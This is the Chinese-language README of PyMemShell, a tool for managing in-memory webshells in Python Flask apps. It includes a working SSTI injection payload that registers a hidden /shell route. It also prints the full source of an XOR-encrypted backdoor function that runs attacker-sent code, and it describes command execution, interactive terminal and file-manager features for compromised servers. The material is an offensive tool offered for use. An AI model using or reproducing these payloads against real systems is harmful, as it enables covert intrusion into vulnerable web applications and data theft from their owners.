# PyMemShell
Python内存马管理工具

在此文[《Python Flask中的SSTI和内存马》](./Python%20Flask中的SSTI和内存马.md)的基础上进行工具的开发和Payload的设计。一个没有完成的工具，代码也不够规范，使用了PyQT5及其相关扩展。

## 使用

启动UI界面（缺啥模块pip一下）

```cmd
python3 MainUI.py
```

如果需要使用demo，可以使用ide或者python来启动，正式的环境部署命令为

```bash
uwsgi --http :5006 --gevent 1000 --http-websockets --master --wsgi-file app.py --callable app
```

修改demo中的app.py

```python
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent')
```

generate_shell.py为生成base64编码的内存马函数，需要通过SSTI或者反序列化漏洞来进行注入

SSTI示例

```python
{{ url_for.__globals__['__builtins__']['exec'](
"
exec(__import__('base64').b64decode('Base64Shell'))
app.view_functions['shell'] = shell_func;
app._got_first_request=False;
app.add_url_rule('/shell', 'shell', shell_func, methods=['POST','GET']);
app._got_first_request=True;
", 
{'request':url_for.__globals__['request'],'ulg': url_for.__globals__, 'app':url_for.__globals__['current_app']})}}
```

Payloads目录下为功能实现的Payload，example为调试脚本。

## 功能

实现的一些基本功能都是参照了冰蝎工具的设计。Payload的写法都依赖于Python自带的一些库实现，支持Windows/Linux，交互过程的流量加密是异或。

利用SSTI漏洞、反序列化漏洞注入内存马。

### 获取基础信息

![image-20240617011227559](assets/image-20240617011227559.png)

### 命令执行窗口

多种命令执行模式，执行的命令是拼接的，用来实现切换目录。

![image-20240617011507336](assets/image-20240617011507336.png)

### 虚拟交互终端

有bug，主要是使用python中的subprocess.Popen模块获取输出流的时候并没有获取到完整的命令提示符行。在这个功能里，通过创建子线程以及实现非堵塞的输入输出管道来控制命令输入和回显输出，端口可以终止服务端的子线程。

![image-20240617011708187](assets/image-20240617011708187.png)

### 文件管理器

基本的文件操作：创建，删除，分块下载，上传。

![image-20240617011740188](assets/image-20240617011740188.png)

### ~~内网穿透~~

### ~~数据库管理~~

### ~~自定义代码执行~~

## Payload的设计

Payload的写法全部采用了Python自带的模块，区分操作系统。交互连接shell的过程模拟了冰蝎的实现，通过脚本生成内存马函数并通过shell密码来预定义异或key，随机数种子，`magic_str`。其中`magic_str`用来在提交请求的时候判断是否为连接shell的请求，加解密的实现在`RandXor.py`中。

在虚拟终端和文件管理功能中，是将函数写好，在使用之前进行注入，后续的小功能就调用注入的函数。注入（也就是定义）函数的时候需要注意：内存马使用的是`exec`来执行代码，每次 `exec` 的执行会在一个新的局部命名空间内执行代码，也就是注入的函数和后续调用的函数不在同一个命名空间中，所以这里的解决方法是将注入的函数保存在flask应用的上下文中，然后通过`exec`执行调用的时候，传递全局命名空间将注入的函数传递进去。

比如下面的例子：`shell_func`就是内存马，`exec(plaintext, parma)`用来执行Payload，同时在注入内存马的时候也是使用的exec函数，并且将 flask 应用上下文中的一些变量（对象）传递了进来，比如`request`  `url_for.__globals__`  `current_app`。同时将这些变量（对象）保存到了`parma`中，此外添加了`resp`用来获得执行结果，然后再执行Payload的时候传递了`parma`作为全局命名空间。

```python
def shell_func():
    import base64
    import random
    parma = {'resp': 'Error', 'app': app, 'gl': ulg}
    if '%magic_str%' in request.get_data(as_text=True):
        p_code = request.get_data(as_text=True).replace('%magic_str%', '')
        ciphertext = base64.b64decode(p_code)
        plaintext = bytearray(len(ciphertext))
        rkey = %rkey%
        key = base64.b64decode('%key%')
        random.seed(rkey)
        for i in range(len(ciphertext)):
            plaintext[i] = ciphertext[i] ^ (random.randint(1, len(ciphertext)) & 0xff) ^ key[i % len(key)]
            plaintext[i] = plaintext[i] ^ rkey
        exec(plaintext, parma)
        plaintext = str(parma['resp']).encode('utf-8')
        ciphertext = bytearray(len(plaintext))
        random.seed(rkey)
        for i in range(len(plaintext)):
            ciphertext[i] = plaintext[i] ^ rkey
            ciphertext[i] = ciphertext[i] ^ (random.randint(1, len(plaintext)) & 0xff) ^ key[i % len(key)]
        parma['resp'] = base64.b64encode(ciphertext).decode('utf-8')
        return str(parma['resp'])
    return parma['resp']
```

```python
{{ url_for.__globals__['__builtins__']['exec'](
"
exec(__import__('base64').b64decode('Base64Shell'))
app.view_functions['shell'] = shell_func;
app._got_first_request=False;
app.add_url_rule('/shell', 'shell', shell_func, methods=['POST','GET']);
app._got_first_request=True;
", 
{'request':url_for.__globals__['request'],'ulg': url_for.__globals__, 'app':url_for.__globals__['current_app']})}}
```

那么注入函数的写法就如下：

```python
def func_1():
	pass
def func_2():
	pass
def X_main(data):
	pass
gl['X_main'] = X_main 
# gl是再exec执行的时候通过parma传递进来的，而gl实际上是SSTI漏洞利用的时候使用exec传递的url_for.__globals__
```

这样就将注入的函数保存到了 flask 的全局命名空间中，那么后续调用注入的函数就如下所示：

```python
resp = gl['X_main']({'type': 'create', 'binPath': '$binPath$'}) # 使用resp来接收返回值
```

`resp`的定义实际上是在`shell_func`内存马中，这样就实现了`exec`函数没有返回值，但是能够获得执行结果。

当然了实现方法不止这一种，也可以暴力的将注入函数保存到Python的内建模块`builtins`中，在文章中有提到。
